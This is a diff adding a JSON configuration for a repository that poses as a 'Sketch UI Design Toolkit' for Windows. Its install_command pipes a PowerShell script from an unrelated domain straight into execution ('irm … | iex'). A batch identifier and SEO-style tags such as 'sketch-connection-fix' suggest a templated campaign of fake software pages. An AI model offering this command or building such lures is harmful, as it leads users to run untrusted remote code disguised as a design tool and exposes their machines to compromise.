@@ -1,0 +1,29 @@
+{
+  "repo": "sketch-ui-design-toolkit",
+  "product": "Sketch UI Design Toolkit",
+  "kind": "design",
+  "install_type": "download",
+  "download_url": "https://sketch.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "design",
+  "topics": [
+    "sketch-pack",
+    "sketch-utility",
+    "sketch-ui-design-tool",
+    "sketch-desktop-windows",
+    "sketch-connection-fix",
+    "sketch-windows-guide",
+    "sketch-design-workspace",
+    "sketch-native-app",
+    "sketch-install-steps",
+    "sketch-steps-2026",
+    "sketch-package",
+    "design-tools",
+    "setup-guide",
+    "media-tools",
+    "pc-software"
+  ]
+}
